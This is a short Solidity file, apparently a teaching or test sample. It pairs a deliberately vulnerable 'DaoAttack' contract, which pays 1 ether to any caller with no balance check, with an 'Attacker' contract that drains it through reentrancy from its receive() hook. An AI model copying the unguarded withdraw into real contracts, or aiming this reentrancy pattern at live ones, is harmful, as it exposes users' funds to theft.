pragma solidity >=0.8.18;

contract DaoAttack {
    constructor() payable {}

    function withdrawBalance() public payable {
        (bool success,) = msg.sender.call{value: 1 ether}("");
        require(success, "Transfer failed.");
    }

    receive() external payable {}
    fallback() external payable {}
}

contract Attacker {
    bool public isComplete = false;
    DaoAttack public dao;

    constructor(address payable _address) payable {
        dao = DaoAttack(_address);
    }

    function attack() public payable {
        dao.withdrawBalance();
    }

    receive() external payable {
        if (isComplete) {
            return;
        }

        isComplete = true;
        dao.withdrawBalance();
    }
}
